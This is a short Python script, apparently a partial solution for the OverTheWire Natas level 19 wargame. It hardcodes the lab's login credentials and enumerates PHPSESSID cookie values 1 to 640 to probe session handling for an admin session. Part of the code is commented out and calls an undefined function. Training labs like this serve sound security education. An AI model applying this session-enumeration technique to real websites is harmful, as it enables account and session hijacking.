import requests
import string
from multiprocessing.pool import Pool, ThreadPool

USERNAME = 'natas19'
PASSWORD = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
AUTH = USERNAME, PASSWORD
URL = 'http://natas19.natas.labs.overthewire.org/'

def response_id(query):
  cookies = {"PHPSESSID": str(query)}
  params = {'username': "admin", "password": "whatever"}
  response = requests.get(URL, params=params, auth=AUTH, cookies=cookies)
  return response.headers["Set-Cookie"]

def main():
  response_ids = [response_id(i) for i in range(1, 641)]
  print(response_ids)
    

  # with Pool(16) as pool:
  #   for response in pool.imap_unordered(try_id, range(1, 641)):
  #     if response is not None:
  #       break
  # print(response.text)



if __name__ == "__main__":
  main()